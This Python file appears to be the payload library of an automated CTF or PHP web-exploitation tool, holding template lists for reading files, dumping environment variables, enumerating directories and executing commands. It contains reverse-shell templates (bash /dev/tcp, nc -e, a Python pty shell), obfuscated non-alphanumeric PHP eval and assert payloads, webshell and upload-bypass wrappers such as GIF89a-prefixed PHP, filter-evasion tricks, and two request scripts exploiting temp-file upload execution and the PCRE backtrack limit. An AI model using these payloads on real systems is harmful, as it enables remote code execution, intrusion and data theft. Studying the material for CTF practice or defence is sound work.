READFILE_TEMPLATES = [
    "cat {path}",
    "tac {path}",
    "nl {path}",
    "more {path}",
    "less {path}",
    "head {path}",
    "tail {path}",
    "sort {path}",
    "od -An -c {path}",
    "strings {path}",
    "paste {path}",
    "grep '.*' {path}",
    "sed -n '1,200p' {path}",
    "rev {path}",
    "uniq {path}",
    "base64 {path}",
    "awk '1' {path}",
    "dd if={path}",
    "ca\\t {path}",
    "ca''t {path}",
    "a=ca;b=t;$a$b {path}",
    "show_source('{path}')",
    "highlight_file('{path}')",
    "readgzfile('{path}')",
    "vi {path}",
    "grep '{keyword}' {path}",
]

READ_ENV_TEMPLATES = [
    "env",
    "printenv",
    "set",
]

ROOT_DISCOVERY_TEMPLATES = [
    "diff / /home",
    "diff / /root",
    "diff / /tmp",
    "diff / /var",
    "diff / /etc",
    "diff / /usr",
    "diff / /opt",
    "diff / /proc",
    "diff / /dev",
    "diff / /bin",
    "diff / /sbin",
    "diff / /srv",
    "diff / /run",
    "diff / /mnt",
    "diff / /media",
    "ls /",
    "b=l;c=s;d=/;$b$c $d",
]

REFLECT_SHELL_TEMPLATES = [
    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc {ip} {port} -e /bin/sh",
    "busybox nc {ip} {port} -e /bin/sh",
    "python -c 'import os,pty,socket; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/sh\")'",
]

PHPINFO_TEMPLATES = [
    "php -r 'phpinfo();'",
    "phpinfo();",
    "(~%8F%97%8F%96%91%99%90)();",
    "$_=(%ff%ff%ff%ff^%a0%b8%ba%ab);$_();",
    "eval(pos(get_defined_vars()));",
    "print_r(getallheaders());",
    "show_source(scandir(getcwd())[2]);",
    "show_source(current(array_reverse(scandir(getcwd()))));",
]

DIRECTORY_ENUM_TEMPLATES = [
    "print_r(scandir('/'));",
    "var_dump(scandir('/'));",
    "var_export(scandir('/'));",
    "echo(implode('--',scandir('/')));",
    "echo json_encode(scandir('/'));",
    "print_r(scandir(dirname(__FILE__)));",
    "print_r(scandir(dirname(__DIR__)));",
    "print_r(scandir(dirname(dirname(__FILE__))));",
    "print_r(scandir(dirname(dirname(__DIR__))));",
    "print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "echo(implode('--',scandir(dirname(dirname(dirname(dirname(__DIR__)))))));",
    "echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));",
    "var_export(glob('*'));",
    "var_export(glob('../*'));",
    "var_export(glob('../../*'));",
    "var_export(glob('../../../*'));",
]

FILE_ENUM_TEMPLATES = [
    "show_source(next(array_reverse(scandir(getcwd()))));",
    "echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));",
    "echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));",
]

# 变量劫持
VARIABLE_HIJACK_TEMPLATES = [
    "eval(array_pop(next(get_defined_vars())));",
]

NON_ALNUM_ASSERT_POST_PAYLOAD = (
    "$__=('>'>'<')+('>'>'<');"
    "$_=$__/$__;"
    "$____='';"
    "$___=\u7730;$____.=~($___[$_]);"
    "$___=\u548c;$____.=~($___[$__]);"
    "$___=\u548c;$____.=~($___[$__]);"
    "$___=\u7684;$____.=~($___[$_]);"
    "$___=\u534a;$____.=~($___[$_]);"
    "$___=\u59cb;$____.=~($___[$__]);"
    "$_____='_';"
    "$___=\u4fef;$_____.=~($___[$__]);"
    "$___=\u7730;$_____.=~($___[$__]);"
    "$___=\u6b21;$_____.=~($___[$_]);"
    "$___=\u7ad9;$_____.=~($___[$_]);"
    "$_=$$_____;"
    "$____($_[$__]);"
)

# 触发 UA 头提示
HEADER_TIP_TRIGGER_PAYLOADS = {
    "print_r(getallheaders());",
    "eval(next(getallheaders()));",
}

# 触发变量劫持的提示
VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS = {
    "eval(array_pop(next(get_defined_vars())));",
}

ASSERT_POST_TIP_TRIGGER_PAYLOADS = {
    NON_ALNUM_ASSERT_POST_PAYLOAD,
}

HEADER_EXEC_TEMPLATES = [
    "eval(next(getallheaders()));",
]

# 空格绕过
SPACE_BYPASS_REPLACEMENTS = [
    "\\t",
    "${IFS}",
    "$IFS$9",
    "/**/",
    "<>",
    "<",
    "%09",
    "%20",
    "%a0",
]

# 无字母webshell
UPLOAD_EXEC_TEMPLATES = [
    ". /???/????????[@-[]",
    ". /tmp/php??????",
    ". /var/tmp/php??????",
]

UPLOAD_EXEC_WRAPPER_TEMPLATES = [
    "?><?=`{cmd}`;?>",
]

SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
    ". /???/????????[@-[]",
    "?><?=`. /???/????????[@-[]`;?>",
]

SPECIAL_UPLOAD_POC_EGS = """
import requests

url = " "

params = {
    "shell":"?><?=`. /???/????????[@-[]`;?>"
}

file = {
    'file':("1.txt","#!/bin/sh\\n cat /flag","text/plain")
}

for i in range(1,20):
    res = requests.post(url=url, params=params, files=file)
    if "flag" in res.text:
        print(res.text)
        break"""

BACKTRACK_LIMIT_POC_EGS = """
import requests

url = " "
payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
res = requests.post(url=url, data={"letter": payload})
print(res.text)
"""

PHP_EXEC_WRAPPERS = [
    "system",
    "passthru",
    "shell_exec",
    "exec",
    "popen",
    "proc_open",
]

# 短标签
SHORT_TAG_TEMPLATES = [
    "<?={payload}?>",
    "<?= {payload} ?>",
]

UPLOAD_MODERN_WRAPPER_TEMPLATES = [
    "<?php {payload} ?>",
    "<?php\n{payload}\n?>",
    "<?php/**/{payload}?>",
    "GIF89a<?php {payload} ?>",
    "GIF89a<?= {expr} ?>",
]

UPLOAD_LEGACY_WRAPPER_TEMPLATES = [
    "<% {payload} %>",
    "<%={expr}%>",
    '<script language="php">{payload}</script>',
]

UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES = [
    "<?=`{cmd}`?>",
    "<?= `{cmd}` ?>",
    "GIF89a<?=`{cmd}`?>",
]

# 反引号
BACKTICK_TEMPLATES = [
    "`{cmd}`",
    "echo `{cmd}`;",
    "print(`{cmd}`);",
    "var_dump(`{cmd}`);",
    "die(`{cmd}`);",
    "exit(`{cmd}`);",
]

BACKTICK_COMMAND_TEMPLATES = [
    "cat {path}",
    "tac {path}",
]

INCLUDE_TEMPLATES = [
    "include $_GET[x];&x=php://filter/read=convert.base64-encode/resource={path}",
    "include('{path}');",
    "require('{path}');",
    "include_once('{path}');",
    "require_once('{path}');",
]

WEBSHELL_TEMPLATES = [
    "eval($_GET[x]);&x=system('{cmd}');",
    "assert($_POST[x]);",
    "call_user_func($_GET[x], $_GET[y]);",
]
